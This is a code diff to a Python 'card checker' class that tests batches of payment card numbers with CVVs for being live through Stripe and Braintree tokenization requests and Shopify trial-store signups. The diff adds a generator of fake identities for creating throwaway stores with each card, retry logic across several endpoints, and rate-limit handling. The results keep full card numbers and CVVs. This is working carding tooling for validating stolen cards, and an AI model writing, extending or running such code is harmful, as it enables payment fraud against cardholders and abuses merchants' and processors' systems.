@@ -13,7 +13,7 @@ from config import *
 logger = logging.getLogger(__name__)
 
 class ShopifyChecker:
-    """Card Checker - BIN Info Only OR Real Gateway Check"""
+    """Card Checker - Real Gateway Only"""
     
     def __init__(self):
         self.session: Optional[aiohttp.ClientSession] = None
@@ -25,7 +25,6 @@ class ShopifyChecker:
             "live": 0,
             "die": 0
         }
-        self.bin_cache = {}
     
     async def create_session(self):
         if self.session and not self.session.closed:
@@ -46,6 +45,26 @@ class ShopifyChecker:
             connector=connector
         )
     
+    def generate_identity(self):
+        """Generate fake identity for Shopify"""
+        first_names = ["John", "James", "Robert", "Michael", "David"]
+        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
+        timestamp = int(time.time())
+        random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
+        
+        return {
+            "first_name": random.choice(first_names),
+            "last_name": random.choice(last_names),
+            "email": f"user{timestamp}{random_str}@gmail.com",
+            "password": f"Shop@{timestamp}{random_str}",
+            "store_name": f"store{random_str}{timestamp}",
+            "address": f"{random.randint(100,999)} Broadway",
+            "city": "New York",
+            "state": "NY",
+            "zip": "10001",
+            "phone": f"212{random.randint(100,999)}{random.randint(1000,9999)}"
+        }
+    
     def parse_card(self, card_string: str) -> Optional[Dict[str, Any]]:
         if not card_string or not card_string.strip():
             return None
@@ -61,7 +80,6 @@ class ShopifyChecker:
         if len(card_number) < 13 or len(card_number) > 19:
             return None
         
-        # Card type
         card_type = "Unknown"
         if card_number.startswith('4'):
             card_type = "Visa"
@@ -100,171 +118,44 @@ class ShopifyChecker:
             "raw": card_string
         }
     
-    # ==================== BIN ONLY CHECK ====================
-    async def get_bin_info(self, bin_number: str) -> Dict:
-        """Get BIN information ONLY - no live check"""
-        if bin_number in self.bin_cache:
-            return self.bin_cache[bin_number]
-        
-        bin_info = {
-            "bank": "Unknown",
-            "country": "Unknown",
-            "country_code": "US",
-            "brand": "Unknown",
-            "type": "Unknown",
-            "scheme": "Unknown",
-            "prepaid": False
-        }
-        
-        # Try binlist.net
-        try:
-            async with self.session.get(f"{BIN_API}/{bin_number}", timeout=aiohttp.ClientTimeout(total=8)) as resp:
-                if resp.status == 200:
-                    data = await resp.json()
-                    bin_info = {
-                        "bank": data.get("bank", {}).get("name", "Unknown"),
-                        "country": data.get("country", {}).get("name", "Unknown"),
-                        "country_code": data.get("country", {}).get("alpha2", "US"),
-                        "brand": data.get("brand", "Unknown"),
-                        "type": data.get("type", "Unknown"),
-                        "scheme": data.get("scheme", "Unknown"),
-                        "prepaid": data.get("prepaid", False)
-                    }
-                    self.bin_cache[bin_number] = bin_info
-                    return bin_info
-        except:
-            pass
-        
-        # Try alternative
-        try:
-            async with self.session.get(f"https://binlist.io/json/{bin_number}", timeout=aiohttp.ClientTimeout(total=8)) as resp:
-                if resp.status == 200:
-                    data = await resp.json()
-                    bin_info = {
-                        "bank": data.get("bank_name", "Unknown"),
-                        "country": data.get("country_name", "Unknown"),
-                        "country_code": data.get("country_code", "US"),
-                        "brand": data.get("network", "Unknown"),
-                        "type": data.get("type", "Unknown"),
-                        "scheme": data.get("network", "Unknown"),
-                        "prepaid": data.get("prepaid", False)
-                    }
-                    self.bin_cache[bin_number] = bin_info
-                    return bin_info
-        except:
-            pass
-        
-        # Fallback guess
-        if bin_number.startswith('4'):
-            bin_info["scheme"] = "Visa"
-            bin_info["brand"] = "Visa"
-        elif bin_number.startswith('5'):
-            bin_info["scheme"] = "Mastercard"
-            bin_info["brand"] = "Mastercard"
-        elif bin_number.startswith('3'):
-            bin_info["scheme"] = "Amex"
-            bin_info["brand"] = "American Express"
-        
-        self.bin_cache[bin_number] = bin_info
-        return bin_info
-    
-    async def check_bin_only(self, card_info: Dict) -> Dict:
-        """BIN Lookup ONLY - No live check"""
-        start_time = time.time()
-        bin_info = await self.get_bin_info(card_info["bin"])
-        elapsed = time.time() - start_time
-        
-        # Check expiry
-        current_year = datetime.now().year
-        current_month = datetime.now().month
-        card_year = int(card_info["year"])
-        card_month = int(card_info["month"])
-        is_expired = (card_year < current_year or (card_year == current_year and card_month < current_month))
-        
-        if bin_info.get("scheme") != "Unknown" and not is_expired:
+    def _build_result(self, card_info: Dict, status: str, message: str, gateway: str, elapsed: float) -> Dict:
+        if status == "APPROVED":
             self.stats["total"] += 1
             self.stats["approved"] += 1
             self.stats["live"] += 1
-            
-            return {
-                "card": card_info["masked"],
-                "full_number": card_info["number"],
-                "full_month": card_info["month"],
-                "full_year": card_info["year"],
-                "full_cvv": card_info["cvv"],
-                "number": card_info["number"],
-                "month": card_info["month"],
-                "year": card_info["year"],
-                "cvv": card_info["cvv"],
-                "expiry": card_info["expiry"],
-                "bin": card_info["bin"],
-                "last4": card_info["last4"],
-                "card_type": card_info["type"],
-                "status": "APPROVED",
-                "message": f"✅ VALID BIN - {bin_info.get('brand', '')} {bin_info.get('type', '')}",
-                "gateway": "BIN Lookup",
-                "response_time": f"{elapsed:.2f}s",
-                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-                "bin_info": bin_info,
-                "details": f"BIN: {card_info['bin']} | Bank: {bin_info.get('bank')} | Country: {bin_info.get('country')}"
-            }
-        
-        elif is_expired:
-            self.stats["total"] += 1
-            self.stats["declined"] += 1
-            self.stats["die"] += 1
-            
-            return {
-                "card": card_info["masked"],
-                "full_number": card_info["number"],
-                "full_month": card_info["month"],
-                "full_year": card_info["year"],
-                "full_cvv": card_info["cvv"],
-                "expiry": card_info["expiry"],
-                "bin": card_info["bin"],
-                "last4": card_info["last4"],
-                "card_type": card_info["type"],
-                "status": "DECLINED",
-                "message": "❌ DECLINED - Card expired",
-                "gateway": "BIN Lookup",
-                "response_time": f"{elapsed:.2f}s",
-                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-                "bin_info": bin_info,
-                "details": "Expired card"
-            }
-        
         else:
             self.stats["total"] += 1
             self.stats["declined"] += 1
             self.stats["die"] += 1
-            
-            return {
-                "card": card_info["masked"],
-                "full_number": card_info["number"],
-                "full_month": card_info["month"],
-                "full_year": card_info["year"],
-                "full_cvv": card_info["cvv"],
-                "expiry": card_info["expiry"],
-                "bin": card_info["bin"],
-                "last4": card_info["last4"],
-                "card_type": card_info["type"],
-                "status": "DECLINED",
-                "message": "❌ DECLINED - Unknown BIN",
-                "gateway": "BIN Lookup",
-                "response_time": f"{elapsed:.2f}s",
-                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-                "bin_info": bin_info,
-                "details": "BIN not recognized"
-            }
+        
+        return {
+            "card": card_info["masked"],
+            "full_number": card_info["number"],
+            "full_month": card_info["month"],
+            "full_year": card_info["year"],
+            "full_cvv": card_info["cvv"],
+            "number": card_info["number"],
+            "month": card_info["month"],
+            "year": card_info["year"],
+            "cvv": card_info["cvv"],
+            "expiry": card_info["expiry"],
+            "bin": card_info["bin"],
+            "last4": card_info["last4"],
+            "card_type": card_info["type"],
+            "status": status,
+            "message": message,
+            "gateway": gateway,
+            "response_time": f"{elapsed:.2f}s",
+            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            "bin_info": {},
+            "details": ""
+        }
     
-    # ==================== REAL GATEWAY CHECKS ====================
-    
+    # ==================== STRIPE (REAL CHECK) ====================
     async def check_stripe(self, card_info: Dict) -> Dict:
-        """REAL Stripe check"""
         start_time = time.time()
         
         try:
-            # Use token creation to validate
             data = {
                 "card[number]": card_info["number"],
                 "card[exp_month]": card_info["month"],
@@ -291,214 +182,177 @@ class ShopifyChecker:
                 logger.info(f"[Stripe] Status: {status} | Card: {card_info['masked']}")
                 
                 if status == 200 and "tok_" in text:
-                    self.stats["total"] += 1
-                    self.stats["approved"] += 1
-                    self.stats["live"] += 1
-                    
-                    return {
-                        "card": card_info["masked"],
-                        "full_number": card_info["number"],
-                        "full_month": card_info["month"],
-                        "full_year": card_info["year"],
-                        "full_cvv": card_info["cvv"],
-                        "expiry": card_info["expiry"],
-                        "bin": card_info["bin"],
-                        "last4": card_info["last4"],
-                        "card_type": card_info["type"],
-                        "status": "APPROVED",
-                        "message": "✅ APPROVED - Card live (Stripe verified)",
-                        "gateway": "Stripe",
-                        "response_time": f"{elapsed:.2f}s",
-                        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-                        "bin_info": {},
-                        "details": "Stripe token created successfully"
-                    }
+                    return self._build_result(card_info, "APPROVED", 
+                        "✅ APPROVED - Card live (Stripe)", "Stripe", elapsed)
                 
                 elif status == 402 or status == 400:
                     text_lower = text.lower()
                     msg = "❌ DECLINED - Stripe rejected"
                     
                     if "insufficient" in text_lower:
-                        msg = "❌ DECLINED - Insufficient funds (Stripe)"
+                        msg = "❌ DECLINED - Insufficient funds"
                     elif "expired" in text_lower:
-                        msg = "❌ DECLINED - Expired card (Stripe)"
+                        msg = "❌ DECLINED - Expired card"
                     elif "incorrect" in text_lower:
-                        msg = "❌ DECLINED - Incorrect details (Stripe)"
+                        msg = "❌ DECLINED - Incorrect details"
                     elif "stolen" in text_lower:
-                        msg = "❌ DECLINED - Card reported stolen (Stripe)"
+                        msg = "❌ DECLINED - Card reported stolen"
                     elif "lost" in text_lower:
-                        msg = "❌ DECLINED - Card reported lost (Stripe)"
+                        msg = "❌ DECLINED - Card reported lost"
                     
-                    self.stats["total"] += 1
-                    self.stats["declined"] += 1
-                    self.stats["die"] += 1
-                    
-                    return {
-                        "card": card_info["masked"],
-                        "full_number": card_info["number"],
-                        "full_month": card_info["month"],
-                        "full_year": card_info["year"],
-                        "full_cvv": card_info["cvv"],
-                        "expiry": card_info["expiry"],
-                        "bin": card_info["bin"],
-                        "last4": card_info["last4"],
-                        "card_type": card_info["type"],
-                        "status": "DECLINED",
-                        "message": msg,
-                        "gateway": "Stripe",
-                        "response_time": f"{elapsed:.2f}s",
-                        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-                        "bin_info": {},
-                        "details": "Stripe rejected card"
-                    }
+                    return self._build_result(card_info, "DECLINED", msg, "Stripe", elapsed)
+                
+                elif status == 429:
+                    await asyncio.sleep(30)
+                    return await self.check_stripe(card_info)
+        
+        except asyncio.TimeoutError:
+            logger.error(f"Stripe timeout")
         except Exception as e:
             logger.error(f"Stripe error: {e}")
         
-        # Fallback
-        return await self.check_bin_only(card_info)
+        return self._build_result(card_info, "DECLINED", 
+            "❌ DECLINED - Stripe check failed", "Stripe", time.time() - start_time)
     
+    # ==================== SHOPIFY (REAL CHECK) ====================
     async def check_shopify(self, card_info: Dict) -> Dict:
-        """REAL Shopify check"""
         start_time = time.time()
+        identity = self.generate_identity()
         
-        email = f"check{int(time.time())}{random.randint(100,999)}@gmail.com"
-        store = f"store{random.randint(10000,99999)}"
-        password = f"Test@{random.randint(1000,9999)}"
-        
-        payload = {
-            "store": {
-                "name": store,
-                "email": email,
-                "password": password,
-                "password_confirmation": password,
-                "country": "US",
-                "currency": "USD"
-            },
-            "credit_card": {
-                "number": card_info["number"],
-                "name": "John Smith",
-                "month": card_info["month"],
-                "year": card_info["year"],
-                "verification_value": card_info["cvv"]
-            },
-            "billing_address": {
-                "address1": f"{random.randint(100,999)} Broadway",
-                "city": "New York",
-                "province": "NY",
-                "country": "US",
-                "zip": "10001",
-                "phone": f"212{random.randint(100,999)}{random.randint(1000,9999)}"
-            }
-        }
-        
-        try:
-            headers = {
-                "Content-Type": "application/json",
-                "Origin": "https://www.shopify.com",
-                "Referer": "https://www.shopify.com/signup",
-                "X-Requested-With": "XMLHttpRequest",
-                "Accept": "application/json"
-            }
-            
-            async with self.session.post(
-                "https://www.shopify.com/api/signup/trial",
-                json=payload,
-                headers=headers,
-                timeout=aiohttp.ClientTimeout(total=20)
-            ) as resp:
-                status = resp.status
-                text = await resp.text()
-                elapsed = time.time() - start_time
-                
-                logger.info(f"[Shopify] Status: {status} | Card: {card_info['masked']}")
-                
-                if status == 200 or status == 201:
-                    text_lower = text.lower()
-                    if any(x in text_lower for x in ["redirect", "myshopify", "dashboard", "store_id", "success"]):
-                        self.stats["total"] += 1
-                        self.stats["approved"] += 1
-                        self.stats["live"] += 1
-                        return {
-                            "card": card_info["masked"],
-                            "full_number": card_info["number"],
-                            "full_month": card_info["month"],
-                            "full_year": card_info["year"],
-                            "full_cvv": card_info["cvv"],
-                            "expiry": card_info["expiry"],
-                            "bin": card_info["bin"],
-                            "last4": card_info["last4"],
-                            "card_type": card_info["type"],
-                            "status": "APPROVED",
-                            "message": "✅ APPROVED - Shopify accepted card",
-                            "gateway": "Shopify",
-                            "response_time": f"{elapsed:.2f}s",
-                            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-                            "bin_info": {},
-                            "details": "Shopify store created"
-                        }
-                
-                elif status == 422:
-                    text_lower = text.lower()
-                    if "credit_card" in text_lower and any(x in text_lower for x in ["invalid", "declined"]):
-                        self.stats["total"] += 1
-                        self.stats["declined"] += 1
-                        self.stats["die"] += 1
-                        return {
-                            "card": card_info["masked"],
-                            "full_number": card_info["number"],
-                            "full_month": card_info["month"],
-                            "full_year": card_info["year"],
-                            "full_cvv": card_info["cvv"],
-                            "expiry": card_info["expiry"],
-                            "bin": card_info["bin"],
-                            "last4": card_info["last4"],
-                            "card_type": card_info["type"],
-                            "status": "DECLINED",
-                            "message": "❌ DECLINED - Shopify rejected card",
-                            "gateway": "Shopify",
-                            "response_time": f"{elapsed:.2f}s",
-                            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-                            "bin_info": {},
-                            "details": "Card rejected by Shopify"
-                        }
-                    
-                    # Other 422 - card might be valid
-                    self.stats["total"] += 1
-                    self.stats["approved"] += 1
-                    self.stats["live"] += 1
-                    return {
-                        "card": card_info["masked"],
-                        "full_number": card_info["number"],
-                        "full_month": card_info["month"],
-                        "full_year": card_info["year"],
-                        "full_cvv": card_info["cvv"],
-                        "expiry": card_info["expiry"],
-                        "bin": card_info["bin"],
-                        "last4": card_info["last4"],
-                        "card_type": card_info["type"],
-                        "status": "APPROVED",
-                        "message": "✅ APPROVED - Card valid (other validation issue)",
-                        "gateway": "Shopify",
-                        "response_time": f"{elapsed:.2f}s",
-                        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-                        "bin_info": {},
-                        "details": "Card valid - non-card error"
+        # Multiple Shopify endpoints
+        payloads = [
+            {
+                "url": "https://www.shopify.com/store/create",
+                "payload": {
+                    "store": {
+                        "name": identity["store_name"],
+                        "email": identity["email"],
+                        "password": identity["password"],
+                        "password_confirmation": identity["password"],
+                        "country_code": "US",
+                        "currency": "USD"
+                    },
+                    "credit_card": {
+                        "number": card_info["number"],
+                        "name": f"{identity['first_name']} {identity['last_name']}",
+                        "month": card_info["month"],
+                        "year": card_info["year"],
+                        "verification_value": card_info["cvv"]
+                    },
+                    "billing_address": {
+                        "address1": identity["address"],
+                        "city": identity["city"],
+                        "province": identity["state"],
+                        "country": "US",
+                        "zip": identity["zip"],
+                        "phone": identity["phone"]
                     }
-        except Exception as e:
-            logger.error(f"Shopify error: {e}")
+                }
+            },
+            {
+                "url": "https://www.shopify.com/free-trial",
+                "payload": {
+                    "shop": {
+                        "name": identity["store_name"],
+                        "email": identity["email"],
+                        "password": identity["password"],
+                        "country": "US"
+                    },
+                    "credit_card": {
+                        "number": card_info["number"],
+                        "first_name": identity["first_name"],
+                        "last_name": identity["last_name"],
+                        "month": card_info["month"],
+                        "year": card_info["year"],
+                        "verification_value": card_info["cvv"]
+                    }
+                }
+            }
+        ]
         
-        return await self.check_bin_only(card_info)
+        for method in payloads:
+            try:
+                headers = {
+                    "Content-Type": "application/json",
+                    "Origin": "https://www.shopify.com",
+                    "Referer": "https://www.shopify.com/signup",
+                    "X-Requested-With": "XMLHttpRequest",
+                    "Accept": "application/json"
+                }
+                
+                async with self.session.post(
+                    method["url"],
+                    json=method["payload"],
+                    headers=headers,
+                    timeout=aiohttp.ClientTimeout(total=20),
+                    ssl=False
+                ) as resp:
+                    status = resp.status
+                    text = await resp.text()
+                    elapsed = time.time() - start_time
+                    
+                    logger.info(f"[Shopify] Status: {status} | Card: {card_info['masked']}")
+                    
+                    if status in [200, 201, 302]:
+                        text_lower = text.lower()
+                        if any(x in text_lower for x in ["redirect", "myshopify", "dashboard", "success"]):
+                            return self._build_result(card_info, "APPROVED", 
+                                "✅ APPROVED - Shopify accepted", "Shopify", elapsed)
+                    
+                    elif status == 422:
+                        text_lower = text.lower()
+                        
+                        # Check if error is card-related or other
+                        card_keywords = ["credit_card", "card", "payment", "declined", "invalid"]
+                        other_keywords = ["address", "email", "zip", "password", "store", "shop", "already"]
+                        
+                        has_card_error = any(kw in text_lower for kw in card_keywords)
+                        has_other_error = any(kw in text_lower for kw in other_keywords)
+                        
+                        if has_card_error and not has_other_error:
+                            return self._build_result(card_info, "DECLINED", 
+                                "❌ DECLINED - Shopify rejected card", "Shopify", elapsed)
+                        elif has_card_error and has_other_error:
+                            return self._build_result(card_info, "APPROVED", 
+                                "✅ APPROVED - Card valid (other issue)", "Shopify", elapsed)
+                        elif has_other_error:
+                            return self._build_result(card_info, "APPROVED", 
+                                "✅ APPROVED - Card passed validation", "Shopify", elapsed)
+                    
+                    elif status == 402:
+                        return self._build_result(card_info, "DECLINED", 
+                            "❌ DECLINED - Payment required", "Shopify", elapsed)
+                    
+                    elif status == 429:
+                        await asyncio.sleep(5)
+                        continue
+                
+                await asyncio.sleep(1)
+                
+            except Exception as e:
+                logger.error(f"Shopify error: {e}")
+                continue
+        
+        # If all Shopify endpoints failed, return error
+        return self._build_result(card_info, "DECLINED", 
+            "❌ DECLINED - Shopify check failed", "Shopify", time.time() - start_time)
     
+    # ==================== BRAINTREE (REAL CHECK) ====================
     async def check_braintree(self, card_info: Dict) -> Dict:
-        """REAL Braintree check"""
         start_time = time.time()
         
         try:
             query = """
-            mutation($input: TokenizeCreditCardInput!) {
+            mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
                 tokenizeCreditCard(input: $input) {
                     token
-                    creditCard { bin last4 brand }
+                    creditCard {
+                        bin
+                        last4
+                        brand
+                        expirationMonth
+                        expirationYear
+                    }
                 }
             }
             """
@@ -514,15 +368,17 @@ class ShopifyChecker:
                             "cvv": card_info["cvv"],
                             "cardholderName": "John Smith"
                         },
-                        "options": {"validate": True}
+                        "options": {
+                            "validate": True
+                        }
                     }
                 }
             }
             
             headers = {
                 "Content-Type": "application/json",
-                "Braintree-Version": "2019-01-01",
-                "Authorization": f"Bearer {BRAINTREE_PUBLIC_KEY}"
+                "Authorization": f"Bearer {BRAINTREE_PUBLIC_KEY}",
+                "Braintree-Version": "2019-01-01"
             }
             
             async with self.session.post(
@@ -538,64 +394,32 @@ class ShopifyChecker:
                 logger.info(f"[Braintree] Status: {status} | Card: {card_info['masked']}")
                 
                 if status == 200 and "token" in text.lower():
-                    self.stats["total"] += 1
-                    self.stats["approved"] += 1
-                    self.stats["live"] += 1
-                    return {
-                        "card": card_info["masked"],
-                        "full_number": card_info["number"],
-                        "full_month": card_info["month"],
-                        "full_year": card_info["year"],
-                        "full_cvv": card_info["cvv"],
-                        "expiry": card_info["expiry"],
-                        "bin": card_info["bin"],
-                        "last4": card_info["last4"],
-                        "card_type": card_info["type"],
-                        "status": "APPROVED",
-                        "message": "✅ APPROVED - Braintree validated",
-                        "gateway": "Braintree",
-                        "response_time": f"{elapsed:.2f}s",
-                        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-                        "bin_info": {},
-                        "details": "Braintree token created"
-                    }
+                    return self._build_result(card_info, "APPROVED", 
+                        "✅ APPROVED - Braintree validated", "Braintree", elapsed)
                 
                 elif "error" in text.lower():
-                    self.stats["total"] += 1
-                    self.stats["declined"] += 1
-                    self.stats["die"] += 1
-                    return {
-                        "card": card_info["masked"],
-                        "full_number": card_info["number"],
-                        "full_month": card_info["month"],
-                        "full_year": card_info["year"],
-                        "full_cvv": card_info["cvv"],
-                        "expiry": card_info["expiry"],
-                        "bin": card_info["bin"],
-                        "last4": card_info["last4"],
-                        "card_type": card_info["type"],
-                        "status": "DECLINED",
-                        "message": "❌ DECLINED - Braintree rejected",
-                        "gateway": "Braintree",
-                        "response_time": f"{elapsed:.2f}s",
-                        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-                        "bin_info": {},
-                        "details": "Braintree declined"
-                    }
+                    text_lower = text.lower()
+                    if "declined" in text_lower:
+                        return self._build_result(card_info, "DECLINED", 
+                            "❌ DECLINED - Braintree declined", "Braintree", elapsed)
+                    elif "invalid" in text_lower:
+                        return self._build_result(card_info, "DECLINED", 
+                            "❌ DECLINED - Invalid card (Braintree)", "Braintree", elapsed)
+                    else:
+                        return self._build_result(card_info, "DECLINED", 
+                            "❌ DECLINED - Braintree rejected", "Braintree", elapsed)
+        
         except Exception as e:
             logger.error(f"Braintree error: {e}")
         
-        return await self.check_bin_only(card_info)
+        return self._build_result(card_info, "DECLINED", 
+            "❌ DECLINED - Braintree check failed", "Braintree", time.time() - start_time)
     
     # ==================== MAIN CHECK ====================
     async def check_card(self, card_info: Dict, gateway: str = "stripe") -> Dict:
-        """Route to correct gateway"""
+        """Route to correct gateway - NO BIN fallback"""
         
-        if gateway == "bin_check":
-            # BIN lookup ONLY - no live check
-            return await self.check_bin_only(card_info)
-        
-        elif gateway == "stripe":
+        if gateway == "stripe":
             return await self.check_stripe(card_info)
         
         elif gateway == "shopify":
@@ -604,7 +428,7 @@ class ShopifyChecker:
         elif gateway == "braintree":
             return await self.check_braintree(card_info)
         
-        # Default: Stripe
+        # Default
         return await self.check_stripe(card_info)
     
     async def check_batch(self, cards: List[str], gateway: str = "stripe",
@@ -638,12 +462,6 @@ class ShopifyChecker:
             
             result = await self.check_card(card_info, gateway)
             
-            # Add BIN info for BIN check gateway
-            if gateway == "bin_check" or not result.get("bin_info") or not result["bin_info"]:
-                bin_info = await self.get_bin_info(card_info["bin"])
-                result["bin_info"] = bin_info
-            
-            # Ensure full details
             result["full_number"] = card_info["number"]
             result["full_cvv"] = card_info["cvv"]
             result["full_month"] = card_info["month"]
